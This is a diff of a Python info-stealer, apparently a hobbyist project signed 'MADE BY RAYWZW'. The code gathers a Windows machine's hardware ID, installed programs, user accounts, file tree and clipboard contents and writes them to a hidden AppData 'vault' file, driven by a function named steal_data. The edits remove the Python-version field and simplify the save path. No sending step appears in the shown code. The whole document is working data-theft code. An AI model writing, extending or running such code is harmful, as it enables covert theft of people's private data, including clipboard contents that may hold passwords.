@@ -13,15 +13,12 @@ def gather_system_info():
             user_name = "Unknown"
         
         hwid = hex(uuid.getnode())
-        
-        python_version = platform.python_version()
 
         try:
             apps = subprocess.check_output('wmic product get name').decode().split('\n')
             installed_apps.extend([app.strip() for app in apps if app.strip()])
         except Exception as e:
             pass
-        
         users.append(user_name)
         try:
             users.extend([user.name for user in psutil.users()])
@@ -50,14 +47,12 @@ def gather_system_info():
     cc = pyperclip.paste()
     clipboard_content = f"{cc}"
     hwid = ""
-
     data_thread = threading.Thread(target=fetch_data, args=(installed_apps, users, file_tree, clipboard_content))
     data_thread.start()
     data_thread.join()
 
     return {
         'HWID': hwid,
-        'Python Version': platform.python_version(),
         'Installed Apps': installed_apps,
         'Users': users,
         'File Tree': file_tree,
@@ -65,13 +60,12 @@ def gather_system_info():
     }
 def save_data(data):
     try:
-        vault_path = os.path.join(os.getenv('APPDATA'), 'vault', 'data')
+        vault_path = os.path.join(os.getenv('APPDATA'), 'vault')
         file_path = os.path.join(vault_path, 'sysinfo.txt')
         os.makedirs(vault_path, exist_ok=True)
         
         with open(file_path, 'w') as f:
             f.write(f"HWID: {data['HWID']}\n--------------MADE BY RAYWZW--------------\n")
-            f.write(f"Python Version: {data['Python Version']}\n--------------MADE BY RAYWZW--------------\n")
             f.write("Installed Apps:\n")
             for app in data['Installed Apps']:
                 f.write(f"- {app}\n")
@@ -84,7 +78,6 @@ def save_data(data):
             f.write(f"--------------MADE BY RAYWZW--------------\nClipboard Content:\n{data['Clipboard']}\n")
     except Exception as e:
         pass
-
 def steal_data():
     data = gather_system_info()
     save_data(data)
